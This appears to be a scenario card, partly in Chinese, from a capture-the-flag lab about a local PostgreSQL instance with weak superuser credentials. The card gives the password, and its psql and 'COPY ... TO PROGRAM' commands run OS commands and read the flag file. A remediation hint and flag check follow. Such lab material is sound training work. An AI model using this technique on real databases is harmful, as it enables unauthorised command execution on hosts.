# DB-01: PostgreSQL Weak Auth RCE

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-01 |
| 名称 | PostgreSQL Weak Auth RCE |
| 技术/CVE | N/A (misconfiguration) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10201 |

## 场景概述
- 技术：N/A (misconfiguration)
- 难度：L2
- 交付方式：docker
- 入口端口：10201
## 攻击路径与利用步骤

| Property | Value |
|----------|-------|
| Technique | COPY PROGRAM |
| Difficulty | L2 |
| Port | 10201 |
| Credentials | postgres / password123 |

### Attack Path
```
Brute-force postgres:password123 → Connect as superuser → COPY ... FROM PROGRAM → RCE → /flag.txt
```

```bash
# Connect with weak credentials
psql -h localhost -p 10201 -U postgres -d postgres
# Password: password123

# Execute OS command via COPY PROGRAM
COPY (SELECT '') TO PROGRAM 'cat /flag.txt';
# flag{db-01-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | PostgreSQL network service and psql |
| 侦察与前置条件 | Weak credential testing and PostgreSQL superuser capability review |
| 核心漏洞与利用 | Authenticate with weak credentials and invoke COPY ... PROGRAM |
| 权限、横向或影响 | Database host command execution |
| 验证 | Read /flag.txt through the command output |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
